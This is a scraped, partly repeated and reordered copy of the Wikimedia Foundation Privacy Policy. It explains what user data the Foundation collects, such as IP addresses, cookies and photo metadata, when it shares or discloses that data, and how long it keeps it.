 * Official Wikimedia Foundation mobile applications.
 * Emails, SMS, and notifications from us or sent to us from you.

This Privacy Policy, however, does not cover some situations where we may gather or process information. For example, some uses may be covered by separate privacy policies (like those of the Wikimedia Shop) or sites or services run by third parties (such as third-party developer projects on Wikimedia Cloud Services). To understand more about what this Privacy Policy does not cover, please see below.



More on what the Wikimedia Foundation Privacy Policy does not cover

This section is part of the Privacy Policy and is meant to explain in detail which situations are not covered by our Privacy Policy.

Wikimedia Sites and Tools with alternative policies Some Wikimedia Foundation websites or tools have alternative privacy policies or provisions that differ from this Privacy Policy. These websites include:
 * Wikipedia Store (covered by the shop's policy);
 * donate.wikimedia.org, including the donation process, such as clicking on a donation banner (covered by the Donor Privacy Policy); and
 * The Wikipedia Reading Lists Browser Extension, which is governed by a separate Privacy Policy. This separate policy will also be made available where the Extension can be downloaded.

If a Wikimedia Foundation website is governed by an alternative privacy policy, it will link to such policy. When a Wikimedia Foundation tool is governed by an alternative privacy policy, the page where the tool may be downloaded or enabled will include a link to that policy. Community members The Wikimedia Sites are collaborative labors of love that are constantly maintained and updated by a global community of volunteers. This global community of volunteers may sometimes have access to personal Information in order to ensure the functioning of the Wikimedia Sites.
 * Administrative volunteers, such as CheckUsers or Stewards. These are volunteers who enforce Wikimedia Site policies and ensure the safety of the Wikimedia Sites. When these administrators access Personal Information that is nonpublic, they are required to comply with our Access to nonpublic personal data policy, as well as other, tool-specific policies.
 * Tool providers. We support platforms for third-party developers to experiment and develop new tools and sites, such as wmflabs.org. When you use one of the tools developed by these volunteers, you may transfer information to them. When these volunteers access nonpublic information or Personal Information, they are required to comply with the terms governing the particular platform the tool is available on.
 * Other users. We provide several tools that allow users to communicate with each other. The communications may be covered by this Policy while they pass through our systems, but the users who receive these communications, and what they do with the communications once they receive them, are not covered by this Policy. Examples include:
   * posting to Foundation-hosted email lists;
   * requesting support from volunteers through our online ticketing system (email sent to infowikimedia.org goes to this system);
   * emailing other users through the Wikimedia Sites (for example, by using the "Email this user" feature); and
   * chatting on IRC (such as on the #wikipedia channel).

Third parties This Privacy Policy only covers the way the Wikimedia Foundation collects, uses and discloses Personal Information and does not address the practices of third parties. For example, this Privacy Policy does not address the practices of:
 * Websites run by other organizations, like websites linked to from the "References" sections of Wikipedia, or run by Wikimedia chapters or other movement organizations. These organizations may receive information from you if you visit their websites after using one of the Wikimedia Sites. They are governed by their own privacy policies.
 * Mobile applications provided by other organizations or individuals. These organizations or individuals may receive information from you if you use those applications to access the Wikimedia Sites or Wikimedia Site content. They are governed by their own privacy policies.

Sometimes, volunteers may place a data-collecting tool, such as a script, gadget, tracking pixel, or share button, on a Wikimedia Site without our knowledge. This Policy does not cover how third parties handle the information they receive as a result of such a tool. If you come across such a third-party tool, and you believe it violates this Policy, you can remove the tool yourself, or report it to privacywikimedia.org so we can investigate.

Where community policies govern information, such as the CheckUser policy, the relevant community may add to the rules and obligations set out in this Policy. However, they are not permitted to create new exceptions or otherwise reduce the protections offered by this Policy.

COLLECTION & USE OF INFO


TYPES OF INFORMATION WE RECEIVE FROM YOU & HOW WE GET IT



YOUR PUBLIC CONTRIBUTIONS



Whatever you post on Wikimedia Sites can be seen and used by everyone.

When you make a contribution to any Wikimedia Site, including on user or discussion pages, you are creating a permanent, public record of every piece of content added, removed, or altered by you. The page history will show when your contribution or deletion was made, as well as your username (if you are signed in) or your IP address (if you are not signed in). We may use your public contributions, either aggregated with the public contributions of others or individually, to create new features or data-related products for you or to learn more about how the Wikimedia Sites are used, as further explained below in the "How We Use Information We Receive From You" section of this Privacy Policy.

Publicly Visible Information

Unless this Policy says otherwise, you should assume that information that you actively contribute to the Wikimedia Sites, including Personal Information, is publicly visible and can be found by search engines. Like most things on the Internet, anything you share may be copied and redistributed throughout the Internet by other people. Please do not contribute any information that you are uncomfortable making permanently public, like revealing your real name or location in your contributions.

You should be aware that specific data made public by you or aggregated data that is made public by us can be used by anyone for analysis and to infer further information, such as which country a user is from, political affiliation and gender.

Back to top


ACCOUNT INFORMATION & REGISTRATION



You do not need to create an account to use any Wikimedia Site.

If you do create an account, you do not need to give us your name or email address (although you can if you choose to, such as for the "Email this user" feature for example).

If you do not create an account, your contributions will be publicly attributed to your IP address.

Want to create an account? Great! Do not want to create an account? No problem!

You are not required to create an account to read or contribute to a Wikimedia Site, except under rare circumstances. However, if you contribute without signing in, your contribution will be publicly attributed to the IP address associated with your device.

If you want to create a standard account, in most cases we require only a username and a password. However, if you choose not to provide an email address, we cannot help you recover your password.

More on Usernames

Your username will be publicly visible, so please be careful about revealing your real name or other Personal Information in your username. Your password is only used to verify that the account is yours. Your IP address is also automatically submitted to us, and we record it temporarily. This is to protect Wikimedia users and project content; in the event of abuse, IP addresses may be associated with usernames as part of an investigation. No other Personal Information is required: no name, no email address, no date of birth, and no credit card information.

Once created, user accounts cannot be removed entirely (although you can usually hide the information on your user page if you choose to). This is because your public contributions must be associated with their author (you!). In some circumstances, the Wikimedia communities can assist users with removing additional information related to their account from the projects.

To gain a better understanding of the demographics of our users, to localize our services and to learn how we can improve our services, we may ask you for more demographic information, such as gender or age, about yourself. We will tell you if such information is intended to be public or private, so that you can make an informed decision about whether you want to provide us with that information. Providing such information is always completely optional. If you do not want to, you do not have to—it is as simple as that.

LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



Some features we offer work better if we know what area you are in.

If you consent, we can use GPS (and other technologies commonly used to determine location) to show you more relevant content. We keep information obtained by these technologies confidential, except as provided in this Policy. You can learn more by checking out the list of examples of how we use these technologies in our FAQ.

Back to top


METADATA



Sometimes, we automatically receive location data from your device. For example, if you want to upload a photo on the Wikimedia Commons mobile app, we may receive metadata, such as the place and time you took the photo, automatically from your device. Please be aware that, unlike location information collected using GPS signals described above, the default setting on your mobile device typically includes the metadata in your photo or video upload to the Wikimedia Sites. If you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



Finally, when you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location.

Back to top



INFORMATION RELATED TO YOUR USE OF THE WIKIMEDIA SITES



We use certain technologies to collect information about how you use Wikimedia Sites.

Like other websites, we receive some information about you automatically when you visit the Wikimedia Sites.

We also use a variety of commonly-used technologies, like cookies, to collect information regarding how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We want to make the Wikimedia Sites better for you by learning more about how you use them. Examples of this might include how often you visit the Wikimedia Sites, what you like, what you find helpful, how you get to the Wikimedia Sites, and whether you would use a helpful feature more if we explained it differently. We also want this Policy and our practices to reflect our community's values. For this reason, we keep information related to your use of the Wikimedia Sites confidential, except as provided in this Policy.

Back to top


INFORMATION WE RECEIVE AUTOMATICALLY



Because of how browsers work, we receive some information automatically when you visit the Wikimedia Sites. This includes when you use an online tool on a third-party site that loads information coming from the Wikimedia Sites. This information includes the type of device you are using (possibly including unique device identification numbers, for some beta versions of our mobile applications), the type and version of your browser, your browser's language preference, the type and version of your device's operating system, in some cases the name of your internet service provider or mobile carrier, the website that referred you to the Wikimedia Sites, which pages you request and visit, and the date and time of each request you make to the Wikimedia Sites.

Put simply, we use this information to enhance your experience with Wikimedia Sites. For example, we use this information to administer the sites, provide greater security, and fight vandalism; optimize mobile applications, customize content and set language preferences, test features to see what works, and improve performance; understand how users interact with the Wikimedia Sites, track and study use of various features, gain understanding about the demographics of the different Wikimedia Sites, and analyze trends.

Back to top


INFORMATION WE COLLECT



We use a variety of commonly-used technologies, like cookies, to understand how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We actively collect some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage. These types of technologies may also be used in online tools on a third-party site that loads information from the Wikimedia Sites. We realize that some of these technologies do not have the best reputation in town and can be used for less-than-noble purposes. So we want to be as clear as we can about why we use these methods and the type of information we collect with them.

Depending on which technology we use, locally stored data may include text, Personal Information (like your IP address), and information about your use of the Wikimedia Sites (like your username or the time of your visit). See below for more information.

We use this information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. We will never use third-party cookies, unless we get your permission to do so. If you ever come across a third-party data collection tool that has not been authorized by you (such as one that may have been mistakenly placed by another user or administrator), please report it to us at privacy@wikimedia.org.

More on Locally Stored Data

Locally stored data, JavaScript, and tracking pixels help us do things like:

 * Provide you with a customizable experience, such as using cookies to know your language preference, to remember the user preferences you set so we can provide you with the customized look and feel that you want, and to tell you about interesting Wikimedia issues and events in your area.
 * Deliver more relevant content to you faster. For example, we use local storage to store your most recently read articles directly on your device, so they can be retrieved quickly. Also, we use cookies to learn about the topics searched so that we can optimize the search results we deliver to you.
 * Understand how you use the Wikimedia Sites, so that we know what works and what is useful. For example, we might use cookies to learn about the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.
 * Understand how you use the Wikimedia Sites across different devices, so that we can make our varied Wikimedia Sites more efficient and effective for you.
 * Make the Wikimedia Sites more convenient to use, such as by using cookies to maintain your session when you log in or to remember your username in the login field.

Want to know even more? You can read more about some of the specific cookies we use, when they expire, and what we use them for in our FAQ.

We believe this data collection helps improve your user experience, but you may remove or disable some or all locally stored data through your browser settings, depending on your browser. You can learn more about some options you have in our FAQ. While locally stored data may not be necessary to use our sites, some features will not function properly if you disable locally stored data.

While the examples above concerning information about you collected through the use of data collection tools are kept confidential in accordance with this Policy, please note that some information about the actions taken by your username is made publicly available through public logs alongside actions taken by other users. For example, a public log may include the date your account was created on a Wikimedia Site along with the dates that other accounts were created on a Wikimedia Site.

OTHER



LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



As stated above, we can use commonly-used location technologies to show you more relevant content. For example, our mobile apps can identify articles from the Wikimedia sites about points of interest near your location. As a reminder, you can consent to and/or deactivate our access to these location technologies at any time for example through the native OS functionalities on your mobile device, and still use the Wikimedia Sites.

Back to top


METADATA



As stated above, we may automatically receive location data from your device. For example, if you upload a photo using the Wikimedia Commons mobile app, please be aware that the default setting on your mobile device typically results in the metadata associated with your photo being included in the upload. As a reminder, if you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



When you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location. We keep IP addresses confidential, except as provided in this Policy. If you are visiting Wikimedia Sites with your mobile device, we may use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

We use this location information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. For example, we use this information to provide greater security, optimize mobile applications, and learn how to expand and better support Wikimedia communities. We also use Personal Information in the manner described in the sections of this Policy titled "For Legal Reasons" and "To Protect You, Ourselves & Others."

Back to top





SHARING


WHEN MAY WE SHARE YOUR INFORMATION?



We use and share your Personal Information when you give us specific permission to do so, for legal reasons, and in the other circumstances described below.

WITH YOUR PERMISSION



We share your Personal Information for a particular purpose, if you agree. For example, if you receive a scholarship and we ask permission to share your Personal Information with a local chapter. You can find more information in the list of examples in our FAQ.

Back to top


FOR LEGAL REASONS



We will disclose your Personal Information to public authorities or other persons in response to an official legal process only if we believe it to be legally valid. See also our Requests for user information procedures and guidelines. We will notify you of such requests when possible. We do so to further our legitimate interest and/or to comply with our legal obligations.

We will access, use, preserve, and/or disclose your Personal Information if we reasonably believe it necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. However, if we believe that a particular request for disclosure of a user's information is legally invalid or an abuse of the legal system and the affected user does not intend to oppose the disclosure themselves, we will try our best to fight it. We are committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your Personal Information in response to a legal demand. However, we may only provide notice if we are not legally restrained from contacting you, there is no credible threat to life or limb that is created or increased by disclosing the request, and you have provided us with an email address.

Nothing in this Privacy Policy is intended to limit any legal objections or defenses you may have to a third-party's request (whether it be civil, criminal, or governmental) to disclose your Personal Information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

For more information, see our Subpoena FAQ.

IF THE ORGANIZATION IS TRANSFERRED (REALLY UNLIKELY!)



In the unlikely event that the ownership of the Foundation changes, we will provide you 30 days' notice before any Personal Information is transferred to the new owners or becomes subject to a different privacy policy.

In the extremely unlikely event that ownership of all or substantially all of the Foundation changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), consistent with our legitimate interest, we will continue to keep your Personal Information confidential, except as provided in this Policy, and provide notice to you via the Wikimedia Sites and a notification on WikimediaAnnounce-L or similar mailing list at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different privacy policy.

Back to top


TO PROTECT YOU, OURSELVES & OTHERS



We, or users with certain administrative rights, use and disclose Personal Information that is reasonably necessary to:

 * enforce or investigate potential violations of the Wikimedia Foundation or community-based policies;
 * protect our organization, infrastructure, employees, contractors, or the public; or
 * prevent imminent or serious bodily harm or death to a person.

We do so to manage our relationship with you, to further our legitimate interest, and/or to comply with our legal obligations.

We, or particular users with certain administrative rights as described below, need to use and share your Personal Information if it is reasonably believed to be necessary to enforce or investigate potential violations of our Terms of Use, this Privacy Policy, or any Wikimedia Foundation or user community-based policies. We may also need to access and share Personal Information to investigate and defend ourselves against legal threats or actions.

Wikimedia Sites are collaborative, with users writing most of the policies and selecting from amongst themselves people to hold certain administrative rights. These rights may include access to limited amounts of otherwise nonpublic information about recent contributions and activity by other users. They use this access to help protect against vandalism and abuse, fight harassment of other users, and generally try to minimize disruptive behavior on the Wikimedia Sites. These various user-selected administrative groups have their own privacy and confidentiality guidelines, but all such groups are supposed to agree to follow our Access to nonpublic personal data policy. These user-selected administrative groups are accountable to other users through checks and balances: users are selected through a community-driven process and overseen by their peers through a logged history of their actions. However, the legal names of these users are not known to the Wikimedia Foundation.

We hope that this never comes up, but we may disclose your Personal Information if we believe that it is reasonably necessary to prevent imminent and serious bodily harm or death to a person, or to protect our organization, employees, contractors, users, or the public. We may also disclose your Personal Information if we reasonably believe it necessary to detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. (Check out the list of examples in our FAQ for more information.)

Back to top


TO OUR SERVICE PROVIDERS



We disclose Personal Information to our third-party service providers or contractors to help run or improve the Wikimedia Sites and provide services in support of our mission.

We use third-party service providers or contractors to help run or improve the Wikimedia Sites for you and other users. We give access to your Personal Information to these providers or contractors as needed to perform their services for us or to use their tools and services. We put requirements, such as confidentiality agreements, in place to help ensure that these service providers treat your Personal Information consistently with, and no less protective of your privacy than, the principles of this Policy. For further information, please see our FAQ.

If you are visiting Wikimedia Sites with your mobile device, we use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page.

Back to top


TO UNDERSTAND & EXPERIMENT


 * We give volunteer developers and researchers access to systems that contain your Personal Information to allow them to protect, develop, and contribute to the Wikimedia Sites.
 * We also share non-Personal Information or aggregated information with third parties interested in studying the Wikimedia Sites.
 * When we share Personal Information with third parties for these purposes, we put reasonable technical and contractual protections in place to protect your Personal Information consistent with this Policy and our legitimate interest.

The open-source software that powers the Wikimedia Sites depends on the contributions of volunteer software developers, who spend time writing and testing code to help it improve and evolve with our users' needs. To facilitate their work, we give some developers limited access to systems that contain your Personal Information, but only as reasonably necessary for them to develop and contribute to the Wikimedia Sites.

Similarly, we share non-Personal Information or aggregated information with researchers, scholars, academics, and other interested third parties who wish to study the Wikimedia Sites. Sharing this Personal Information helps them understand usage, viewing, and demographics statistics and patterns. They then can share their findings with us and our users so that we can all better understand and improve the Wikimedia Sites.

When we give access to Personal Information to third-party developers or researchers, we put requirements, such as reasonable technical and contractual protections, in place to help ensure that these service providers treat your Personal Information consistently with the principles of this Policy and in accordance with our instructions. If these developers or researchers later publish their work or findings, we ask that they not disclose your Personal Information. Please note that, despite the obligations we impose on developers and researchers, we cannot guarantee that they will abide by our agreement, nor do we guarantee that we will regularly screen or audit their projects. (You can learn more about re-identification in our FAQ.)

Back to top


BECAUSE YOU MADE IT PUBLIC



Information that you post is public and can be seen and used by everyone.

Any information you post publicly on the Wikimedia Sites is just that – public. For example, if you put your mailing address on your talk page, that is public, and not specifically protected by this Policy. And if you edit without registering or logging into your account, your IP address will be seen publicly. Please think carefully about your desired level of privacy before you disclose Personal Information on your user page or elsewhere.

Back to top





PROTECTION


HOW DO WE PROTECT YOUR PERSONAL INFORMATION?



We use a variety of physical and technical measures, policies, and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.

We strive to protect your Personal Information from unauthorized access, use, or disclosure. We use a variety of physical and technical measures, policies, and procedures (such as access control procedures, network firewalls, and physical security) designed to protect our systems and your Personal Information. Unfortunately, there is no such thing as completely secure data transmission or storage, so we cannot guarantee that our security will not be breached (by technical measures or through violation of our policies and procedures).

We will never ask for your password by email (but may send you a temporary password via email if you have requested a password reset). If you ever receive an email that requests your password, please let us know by sending it to privacy@wikimedia.org, so we can investigate the source of the email.

Back to top



HOW LONG DO WE KEEP YOUR DATA?



Except as otherwise stated in this Policy, we only keep your Personal Information as long as necessary to maintain, understand and improve the Wikimedia Sites or to comply with applicable law.

Once we receive Personal Information from you, we keep it for the shortest possible time that is consistent with the maintenance, understanding, and improvement of the Wikimedia Sites, and our obligations under applicable law. In most instances, Personal Information is deleted, aggregated or de-identified after 90 days. Non-Personal Information may be retained indefinitely as appropriate. (Check out the list of examples in our FAQ.)

Please remember that when you make a contribution to any Wikimedia Site, the page history will show when your contribution was made, your username (if you are signed in), or your IP address (if you edit while not logged in). The transparency of the projects' contribution and revision histories is critical to their efficacy and trustworthiness. To learn more about our data retention practices, see our data retention guidelines.

Back to top



YOUR RIGHTS



If you would like to request access to or removal of your Personal Information, you may contact us.

For information about how you may request removal of your Personal Information, or other rights you may have with respect to your Personal Information, see our FAQ. If you would like to request to access, update or restrict/object to the processing of Personal Information, or receive a copy of your Personal Information for purposes of transmitting it to another organization, you may Contact Us. We will respond to your request consistent with applicable law.

Please note also that you may be able to exercise some of these rights without our intervention. For example, if you are a registered user, you can access and update some Personal Information in your Preferences, as well as download your user account data. You may also manage what kinds of notifications you receive and how often you receive them by going to your Notifications Preferences.

IMPORTANT INFO

For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.




WHERE IS THE FOUNDATION & WHAT DOES THAT MEAN FOR ME?



The Wikimedia Foundation is a non-profit organization based in San Francisco, California, with servers and data centers located in the U.S. If you decide to use Wikimedia Sites, whether from inside or outside of the U.S., you understand that your Personal Information will be collected, transferred, stored, processed, disclosed and otherwise used in the U.S. as described in this Privacy Policy. You also understand that your information may be transferred by us from the U.S. to other countries, which may have different or less stringent data protection laws than your country, in connection with providing services to you.

Back to top



OUR RESPONSE TO DO NOT TRACK (DNT) SIGNALS



We are strongly committed to protecting users' Personal Information. Under this Policy, we may share your information only under particular situations, which you can learn more about in the "When May We Share Your Information" section of this Privacy Policy. In particular, we do not share your Personal Information for marketing purposes.

Because we protect all users in accordance with this Privacy Policy, we do not change our behavior in response to a web browser's "do not track" signal. For more information regarding Do Not Track signals and how we handle them, please visit our FAQ.

Back to top



CHANGES TO THIS PRIVACY POLICY



Substantial changes to this Policy will not be made until after a public comment period of at least 30 days.

Because things naturally change over time and we want to ensure our Privacy Policy accurately reflects our practices and the law, it may be necessary to modify this Privacy Policy from time to time. We reserve the right to do so in the following manner:

 * In the event of substantial changes, we will provide the proposed changes to our users in at least three (3) languages (selected at our discretion) for an open comment period lasting at least thirty (30) calendar days. Prior to the start of any comment period, we will provide notice of such changes and the opportunity to comment via the Wikimedia Sites, and via a notification on WikimediaAnnounce-L or a similar mailing list.
 * For minor changes, such as grammatical fixes, administrative or legal changes, or corrections of inaccurate statements, we will post the changes and, when possible, provide at least three (3) calendar days' prior notice via WikimediaAnnounce-L or similar mailing list.

We ask that you please review the most up-to-date version of our Privacy Policy. Your continued use of the Wikimedia Sites after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of this Privacy Policy on your part.

Wikimedia Foundation Privacy Policy

This is a summary of the Privacy Policy. To read the full terms, scroll down or click here.
Disclaimer: This summary is not a part of the Privacy Policy and is not a legal document. It is simply a handy reference for understanding the full Privacy Policy. Think of it as the user-friendly interface to our Privacy Policy.


Because we believe that you should not have to provide personal information to participate in the free knowledge movement, you may:

 * Read, edit, or use any Wikimedia Site without registering an account.
 * Register for an account without providing an email address or real name.

Because we want to understand how Wikimedia Sites are used so we can make them better for you, we collect some information when you:

 * Make public contributions.
 * Register an account or update your user page.
 * Use the Wikimedia Sites.
 * Send us emails or participate in a survey or give feedback.

We are committed to:

 * Describing how your information may be used or shared in this Privacy Policy.
 * Using reasonable measures to keep your information secure.
 * Never selling your information or sharing it with third parties for marketing purposes.
 * Only sharing your information in limited circumstances, such as to improve the Wikimedia Sites, to comply with the law, or to protect you and others.
 * Retaining your data for the shortest possible time that is consistent with maintaining, understanding, and improving the Wikimedia Sites, and our obligations under applicable law.

Be aware:

 * Any content you add or any change that you make to a Wikimedia Site will be publicly and permanently available.
 * If you add content or make a change to a Wikimedia Site without logging in, that content or change will be publicly and permanently attributed to the IP address used at the time rather than a username.
 * Our community of volunteer editors and contributors is a self-policing body. Certain administrators of the Wikimedia Sites, who are chosen by the community, use tools that grant them limited access to nonpublic information about recent contributions so they may protect the Wikimedia Sites and enforce policies.
 * This Privacy Policy does not apply to all sites and services run by the Wikimedia Foundation, such as sites or services that have their own privacy policy (like the Wikimedia Shop) or sites or services run by third parties (like third-party developer projects on Wikimedia Cloud Services).
 * As part of our commitment to education and research around the world, we occasionally release public information and aggregated or non-personal information to the general public through data dumps and data sets.
 * For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.

INTRODUCTION


WELCOME!



The Wikimedia Foundation is the nonprofit organization that operates collaborative, free knowledge websites, like Wikipedia, Wikimedia Commons, and Wiktionary.

This Policy explains how we collect, use, and share your Personal Information.

 * We collect very little Personal Information about you.
 * We do not rent or sell your Personal Information to third parties.

By using Wikimedia Sites, you consent to this Policy.

The Wikimedia movement is founded on a simple, but powerful principle: we can do more together than any of us can do alone. We cannot work collectively without gathering, sharing, and analyzing information about our users as we seek new ways to make the Wikimedia Sites more usable, safer, and more beneficial.

We believe that information-gathering and use should go hand-in-hand with transparency. This Privacy Policy explains how the Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, like Wikipedia, collects, uses, and shares information we receive from you through your use of the Wikimedia Sites. It is essential to understand that, by using any of the Wikimedia Sites, you consent to the collection, transfer, processing, storage, disclosure, and use of your information as described in this Privacy Policy. That means that reading this Policy carefully is important.

We believe that you should not have to provide nonpublic Personal Information to participate in the free knowledge movement. You do not have to provide things like your real name, address, or date of birth to sign up for a standard account or contribute content to the Wikimedia Sites.

We do not sell or rent your Personal Information, nor do we give it to others to sell you anything. We use it to figure out how to make the Wikimedia Sites more engaging and accessible, to see which ideas work, and to make learning and contributing more fun. Put simply: we use this information to make the Wikimedia Sites better for you.

After all, it is people like you, the champions of free knowledge, who make it possible for the Wikimedia Sites to not only exist, but also grow and thrive.



DEFINITIONS

Back to top


We recognize that only a minority of you are familiar with technical terms like "tracking pixels" and "cookies" used in the Privacy Policy.

Whether you are brand new to privacy terminology or you are an expert who just wants a refresher, you might find our Glossary of Key Terms helpful.

Because everyone (not just lawyers) should be able to easily understand how and why their information is collected and used, we use common language instead of more formal terms throughout this Policy. To help ensure your understanding of some particular key terms, here is a table of translations:




When we say... ...we mean: "the Wikimedia Foundation" / "the Foundation" / "we" / "us" / "our" The Wikimedia Foundation, Inc., the non-profit organization that operates the Wikimedia Sites. "Wikimedia Sites" / "our services" Wikimedia websites and services (regardless of language), including our main projects, such as Wikipedia and Wikimedia Commons, as well as mobile applications, Application Programming Interfaces (APIs), emails, and notifications; excluding, however, sites and services listed in the "What This Privacy Policy Does Not Cover" section below. "you" / "your" / "me" You, regardless of whether you are an individual, group, or organization, and regardless of whether you are using the Wikimedia Sites or our services on behalf of yourself or someone else. "this Policy" / "this Privacy Policy" This document, entitled the "Wikimedia Foundation Privacy Policy". "contributions" Content you add or changes you make to any Wikimedia Sites. "Personal information" Information you provide us or information we collect that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be "personal information" if it is otherwise nonpublic and can be used to identify you: (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, payment account number; (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion. "third party" / "third parties" Individuals, entities, websites, services, products, and applications that are not controlled, managed, or operated by the Wikimedia Foundation. This includes other Wikimedia users and independent organizations or groups who help promote the Wikimedia movement such as Wikimedia chapters, thematic organizations, and user groups as well as volunteers, employees, directors, officers, grant recipients, and contractors of those organizations or groups.




WHAT THIS PRIVACY POLICY DOES AND DOES NOT COVER

Except as explained below, this Privacy Policy applies to our collection and handling of information about you that we receive as a result of your use of any of the Wikimedia Sites. This Policy also applies to information that we receive from our partners or other third parties. To understand more about what this Privacy Policy covers, please see below.

Examples of What This Privacy Policy Covers

For the sake of clarity, this Privacy Policy covers, regardless of language:

 * All of our major sites (found at list of major projects), such as Wikipedia, including user pages, discussion pages, and noticeboards.
 * Our blogs and APIs (unless we have provided a separate policy for those services).
 * Official Wikimedia Foundation mobile applications.
 * Emails, SMS, and notifications from us or sent to us from you.

This Privacy Policy, however, does not cover some situations where we may gather or process information. For example, some uses may be covered by separate privacy policies (like those of the Wikimedia Shop) or sites or services run by third parties (such as third-party developer projects on Wikimedia Cloud Services). To understand more about what this Privacy Policy does not cover, please see below.



More on what the Wikimedia Foundation Privacy Policy does not cover

This section is part of the Privacy Policy and is meant to explain in detail which situations are not covered by our Privacy Policy.

Wikimedia Sites and Tools with alternative policies Some Wikimedia Foundation websites or tools have alternative privacy policies or provisions that differ from this Privacy Policy. These websites include:
 * Wikipedia Store (covered by the shop's policy);
 * donate.wikimedia.org, including the donation process, such as clicking on a donation banner (covered by the Donor Privacy Policy); and
 * The Wikipedia Reading Lists Browser Extension, which is governed by a separate Privacy Policy. This separate policy will also be made available where the Extension can be downloaded.

If a Wikimedia Foundation website is governed by an alternative privacy policy, it will link to such policy. When a Wikimedia Foundation tool is governed by an alternative privacy policy, the page where the tool may be downloaded or enabled will include a link to that policy. Community members The Wikimedia Sites are collaborative labors of love that are constantly maintained and updated by a global community of volunteers. This global community of volunteers may sometimes have access to personal Information in order to ensure the functioning of the Wikimedia Sites.
 * Administrative volunteers, such as CheckUsers or Stewards. These are volunteers who enforce Wikimedia Site policies and ensure the safety of the Wikimedia Sites. When these administrators access Personal Information that is nonpublic, they are required to comply with our Access to nonpublic personal data policy, as well as other, tool-specific policies.
 * Tool providers. We support platforms for third-party developers to experiment and develop new tools and sites, such as wmflabs.org. When you use one of the tools developed by these volunteers, you may transfer information to them. When these volunteers access nonpublic information or Personal Information, they are required to comply with the terms governing the particular platform the tool is available on.
 * Other users. We provide several tools that allow users to communicate with each other. The communications may be covered by this Policy while they pass through our systems, but the users who receive these communications, and what they do with the communications once they receive them, are not covered by this Policy. Examples include:
   * posting to Foundation-hosted email lists;
   * requesting support from volunteers through our online ticketing system (email sent to infowikimedia.org goes to this system);
   * emailing other users through the Wikimedia Sites (for example, by using the "Email this user" feature); and
   * chatting on IRC (such as on the #wikipedia channel).

Third parties This Privacy Policy only covers the way the Wikimedia Foundation collects, uses and discloses Personal Information and does not address the practices of third parties. For example, this Privacy Policy does not address the practices of:
 * Websites run by other organizations, like websites linked to from the "References" sections of Wikipedia, or run by Wikimedia chapters or other movement organizations. These organizations may receive information from you if you visit their websites after using one of the Wikimedia Sites. They are governed by their own privacy policies.
 * Mobile applications provided by other organizations or individuals. These organizations or individuals may receive information from you if you use those applications to access the Wikimedia Sites or Wikimedia Site content. They are governed by their own privacy policies.

Sometimes, volunteers may place a data-collecting tool, such as a script, gadget, tracking pixel, or share button, on a Wikimedia Site without our knowledge. This Policy does not cover how third parties handle the information they receive as a result of such a tool. If you come across such a third-party tool, and you believe it violates this Policy, you can remove the tool yourself, or report it to privacywikimedia.org so we can investigate.

Where community policies govern information, such as the CheckUser policy, the relevant community may add to the rules and obligations set out in this Policy. However, they are not permitted to create new exceptions or otherwise reduce the protections offered by this Policy.

COLLECTION & USE OF INFO


TYPES OF INFORMATION WE RECEIVE FROM YOU & HOW WE GET IT



YOUR PUBLIC CONTRIBUTIONS



Whatever you post on Wikimedia Sites can be seen and used by everyone.

When you make a contribution to any Wikimedia Site, including on user or discussion pages, you are creating a permanent, public record of every piece of content added, removed, or altered by you. The page history will show when your contribution or deletion was made, as well as your username (if you are signed in) or your IP address (if you are not signed in). We may use your public contributions, either aggregated with the public contributions of others or individually, to create new features or data-related products for you or to learn more about how the Wikimedia Sites are used, as further explained below in the "How We Use Information We Receive From You" section of this Privacy Policy.

Publicly Visible Information

Unless this Policy says otherwise, you should assume that information that you actively contribute to the Wikimedia Sites, including Personal Information, is publicly visible and can be found by search engines. Like most things on the Internet, anything you share may be copied and redistributed throughout the Internet by other people. Please do not contribute any information that you are uncomfortable making permanently public, like revealing your real name or location in your contributions.

You should be aware that specific data made public by you or aggregated data that is made public by us can be used by anyone for analysis and to infer further information, such as which country a user is from, political affiliation and gender.

Back to top


ACCOUNT INFORMATION & REGISTRATION



You do not need to create an account to use any Wikimedia Site.

If you do create an account, you do not need to give us your name or email address (although you can if you choose to, such as for the "Email this user" feature for example).

If you do not create an account, your contributions will be publicly attributed to your IP address.

Want to create an account? Great! Do not want to create an account? No problem!

